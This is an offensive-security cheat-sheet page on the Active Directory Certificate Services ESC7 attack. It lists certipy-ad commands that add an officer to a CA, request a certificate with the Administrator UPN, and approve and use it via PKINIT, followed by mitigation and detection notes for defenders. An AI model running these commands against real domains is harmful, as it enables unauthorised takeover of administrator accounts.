---
topic: AD CS — ESC7 with ManageCA and ManageCertificates
tags: [windows, activedirectory, adcs, esc7, certipy]
---

# AD CS — ESC7 with ManageCA and ManageCertificates

[🇪🇸 Español](adcs-esc7.md) | **English**

## Concept

ESC7 appears when an unprivileged account has `ManageCA` or `ManageCertificates` over the CA. Those rights allow approving pending requests, adding officers and issuing a certificate with an administrator SAN, later used with PKINIT.

## When it applies

- `certipy find -vulnerable` flags ESC7.
- The controlled account belongs to `ManageCA` or `ManageCertificates`.
- The CA allows pending requests.

## Procedure

1. Enumerate the CA and confirm the rights.
2. Add the account as an officer.
3. Request a certificate with the Administrator UPN.
4. Approve it and authenticate with PKINIT.

```bash
certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC> -vulnerable
certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA> -add-officer <USER>
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA> -template User -upn administrator@<DOMAIN>
certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA> -issue-request <ID>
```

## Variants

- Use `ManageCertificates` to approve an existing request.
- Combine with ESC1 when the template allows a SAN.
- Request a computer certificate and use it for RBCD.

## Limitations

- The CA must allow the approval flow.
- The certificate needs a client-authentication EKU.
- A patch or role audit blocks the attack.

## Mitigation

- Review and remove `ManageCA`/`ManageCertificates` from users.
- Separate CA roles and require multi-officer approval.
- Audit certificates with an admin SAN.

## Detection

- New CA officers.
- Requests approved outside business hours.
- Certificates with the Administrator UPN.

## References

- [Certipy — ESC7](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7)
- [0xdf — Manager](https://0xdf.gitlab.io/2024/03/16/htb-manager.html)
- [SpecterOps — AD CS attack paths](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
